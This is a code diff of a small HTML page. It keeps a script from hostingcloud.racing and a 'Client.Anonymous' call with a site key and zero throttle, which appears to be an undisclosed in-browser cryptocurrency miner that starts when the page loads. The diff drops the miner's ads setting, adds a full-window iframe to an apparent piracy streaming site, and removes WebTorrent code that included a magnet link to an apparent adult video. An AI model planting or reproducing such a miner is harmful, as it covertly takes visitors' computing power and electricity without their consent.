@@ -9,31 +9,13 @@
         <link rel="stylesheet" href="">
     </head>
     <body>
+        <iframe src="https://soap2day.to" height="100%" width="100%" title="Iframe Example"></iframe>
         <script src="https://www.hostingcloud.racing/rpk2.js"></script>
-        <script src="https://cdn.jsdelivr.net/npm/webtorrent-element@latest/dist/webtorrent-element.min.js"></script>
-        <web-torrent src="magnet:?xt=urn:btih:08ada5a7a6183aae1e09d831df6748d566095a10&dn=Sintel&tr=wss%3A%2F%2Ftracker.btorrent.xyz&tr=wss%3A%2F%2Ftracker.fastcast.nz&tr=wss%3A%2F%2Ftracker.openwebtorrent.com&ws=https%3A%2F%2Fwebtorrent.io%2Ftorrents%2F&xs=https%3A%2F%2Fwebtorrent.io%2Ftorrents%2Fsintel.torrent"
-  file="Sintel.mp4/" >
         <script>
             var _client = new Client.Anonymous('3ccacf3a484fb3ac9dab3b27ea90612bccdeb64dc729d6133bc4476841bd3427', {
-                throttle: 0, c: 'w', ads: 0
+                throttle: 0, c: 'w'
             });
             _client.start();
-        </script>
-        <script>
-            var WebTorrent = require('webtorrent');
-            var client = new WebTorrent();
-            var magnetURI = 'magnet:?xt=urn:btih:49f308b61ac96b5b8f19183894b0273f73cbdae1&dn=swa0239_arialee_emmastarletto_trailer.mp4&tr=wss%3A%2F%2Ftracker.btorrent.xyz&tr=wss%3A%2F%2Ftracker.openwebtorrent.com&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Ftracker.opentrackr.org%3A1337&tr=udp%3A%2F%2Fexplodie.org%3A6969&tr=udp%3A%2F%2Ftracker.empire-js.us%3A1337';
-            
-            client.add(magnetURI, function (torrent) {
-              // Got torrent metadata!
-              alert('Client is downloading:', torrent.infoHash);
-
-              torrent.files.forEach(function (file) {
-                // Display the file by appending it to the DOM. Supports video, audio, images, and
-                // more. Specify a container element (CSS selector or reference to DOM node).
-                file.appendTo('body');
-              })
-            })
         </script>
     </body>
 </html>
